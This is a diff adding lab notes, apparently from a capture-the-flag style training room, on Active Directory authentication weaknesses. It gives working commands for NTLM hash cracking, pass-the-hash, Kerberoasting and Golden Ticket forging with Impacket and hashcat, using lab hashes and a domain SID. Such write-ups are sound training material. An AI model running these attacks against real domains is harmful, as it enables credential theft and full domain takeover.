@@ -163,6 +163,130 @@ impacket-smbclient thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.10
 
 ## Weaknesses in AD Authentication
 
+### NTLM-Specific Weaknesses:
+
+- Weak Cryptography
+- Pass-the-hash (PtH)
+- NTLM Relay Attacks
+- Downgrade Attacks
+- No Mutual Authentication
+
+### Kerberos-Specific Weaknesses:
+
+- Kerberoasting
+- AS-REP Roasting
+- Pass-the-Ticket (PtT)
+- Overpass-the-Hash
+- Golden Ticket Attacks
+- Silver Ticket Attacks
+
+### Configuration-Based Weaknesses:
+
+- Weak Passwords
+- Password Spraying
+- Misconfigured Delegation
+- Stale Credentials
+
+## Practical Scenario
+
+Four methods will be demonstrated.
+
+### 1. Weak Password Hashing
+
+Here is one user credentials you obtained:
+
+```text
+phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
+```
+
+You can crack that with Hashcat or JohnTheRipper. The room showed example with Hashcat:
+
+```bash
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+```
+Where, `hash.txt` contains the hash above.
+
+And then with the recovered passwords, you can authenticate with:
+
+```bash
+impacket-smbclient "thm.loc/phillip:<RECOVERED_PASSWORD>"@192.168.11.51
+```
+
+### 2. Pass the Hash
+
+You have obtained the hash for the user `ben`:
+
+```text
+63CF41DC25C04B8FB79E44B1DEF12C10
+```
+
+You don't really need to crack the hash, you can just authenticate using `-hashes` arguments:
+
+```bash
+impacket-smbclient thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
+```
+
+### 3. Kerberoasting
+
+It is an attack targeting service accounts in AD. When a user request access to a service, they receive a Service Ticket (TGS-REP) that is encrypted with the service account's password hash. Any authenticated domain user can request these service tickets for any service in the domain, even services they don't actually need to access.
+
+So, there are three steps involved:
+
+- First, get the Service Ticket (TGS-REP) that is encrypted with the service account's password hash.
+- Second, crack the hash using Hashcat or Johntheripper
+- Third, use the recovered password to authenticate to the file share
+
+Getting the ticket encrypted with service account's password hash:
+
+```bash
+impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
+```
+
+Cracking it with Hashcat:
+
+```bash
+hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
+```
+
+The `service_ticket.txt` contains the hash that was obtained from the previous command.
+
+Authenticating:
+
+```bash
+impacket-smbclient "thm.loc/svc_printer:<RECOVERED_PASSWORD>"@192.168.11.51
+```
+
+### 4. Golden Ticket
+
+This is the most powerful authentication attack in AD. It involves forging Kerberos TGTs by using the password hash of the KRBTGT account. An attacker who obtains this hash can create valid tickets for any user in the domain, including Domain Admins, without needing their actual credentials.
+
+You have these hashes for the domain:
+
+```text
+KRBTGT Hash: e9a9871b93d7b4d73c91665bd6df6e50
+Domain SID: S-1-5-21-990021728-513958382-3715561918
+```
+
+You can forge a Golden Ticket for the domain administrator using Impacket's ticketer:
+
+```bash
+impacket-ticketer -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
+```
+
+This will create the `Administrator.ccache` file in your current directory. And you can export this with:
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+And now you authenticate:
+
+```bash
+impacket-smbclient thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
+```
+
+And you get the administrator access.
+
 ## Detections and Mitigations
 
 ## Conclusion
